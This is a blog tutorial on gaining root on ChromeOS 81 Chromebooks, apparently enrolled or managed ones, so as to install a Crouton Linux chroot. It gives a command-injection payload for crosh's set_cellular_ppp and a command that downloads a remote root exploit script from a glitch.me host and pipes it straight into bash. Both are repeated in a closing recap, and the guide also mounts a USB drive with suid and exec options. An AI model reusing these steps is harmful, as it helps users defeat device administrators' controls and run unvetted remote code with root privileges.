# Adventures in Chroots

This post is a follow-up to "Privelige escalation without un-enrolling". If you haven't read it yet, then you totally should.

After discovering how to run executables off of a USB drive mounted with `exec`, I wanted to get Crouton running, to allow for a graphical environment to run piggybacking off of ChromeOS's X server. After a bit of experimenting, I managed to get everything running as expected, and I'll walk you through the steps below. 

First off, downgrade to ChromeOS 81. It's required for this whole thing to work. Open up crosh and use the `set_cellular_ppp` exploit to get to bash:

```
set_cellular_ppp \';bash;exit;\'
```

Now, we get root...

```bash
bash <(curl https://hostz.glitch.me/80.sh)
```

And after a few seconds, you should be dropped into an SSH session pointing to `localhost`. Plugin your USB drive or SD card (ext4 formatted) now. Find it (it's usually /dev/sda) with `fdisk`:

```bash
fdisk -l
```

Now, we need to create a mount point, and we'll do so in the only mounted filesystem that is read-write: `chronos`'s home directory.

```bash
mkdir -p /home/chronos/usbdrv
```

And we mount the USB drive (replacing /dev/sdX with the block device that points to your USB drive/SD card):

```bash
mount -o exec,suid,dev,symfollow /dev/sdX /home/chronos/usbdrv
cd /home/chronos/usbdrv
ls # Verify that the files were mounted.
```
Now we need to download the git repo:

```bash
curl https://github.com/rainestorme/crouton/archive/refs/tags/downloadlink.tar.gz -o crouton.tar.gz
tar -xvf crouton.tar.gz
mv crouton-downloadlink crouton
rm crouton.tar.gz
cd crouton
```

Now that we have the crouton source, we need to add the `host-bin` directory to the `$PATH`. 

```bash
export PATH="/home/chronos/usbdrv/crouton/host-bin:$PATH"
```

To install a chroot, we need to also download the crouton installer (I know, It's tedious).

```bash
curl https://raw.githubusercontent.com/dnschneid/crouton/master/installer/crouton -o crouton
chmod +x crouton
```

Finally, we need to install a chroot. A list of targets is available on [here](https://github.com/rainestorme/crouton/tree/master/targets). I personally reccommend `xfce` for lower-end Chromebooks, so that's what I went with in this tutorial.

```bash
./crouton -t xfce -p ./
```

This command will take a bit (for me it took 50 minutes on my `lars` Chromebook) and will eventually prompt you for a username and password. Set them (the password won't be shown in the terminal) and wait for the rest of the process to finish.

Now that you've installed the chroot, you can run `startxfce` (in the case that you chose an xfce desktop environment) and it will mount the required filesystems automatically.

In the case that you restarted your terminal at any point after installing the chroot, then you can run the following commands to remount the drive and add the scripts back to your `$PATH`:

```bash
# In crosh
set_cellular_ppp \';bash;exit;\'
# In bash
bash <(curl https://hostz.glitch.me/80.sh)
# In the root SSH prompt
mkdir -p /home/chronos/usbdrv
mount -o exec,suid,dev,symfollow /dev/sdX /home/chronos/usbdrv # Remember to replace /dev/sdX, use "fdisk -l" to find your drive
cd /home/chronos/usbdrv
export PATH="/home/chronos/usbdrv/crouton/host-bin:$PATH"
startxfce
```
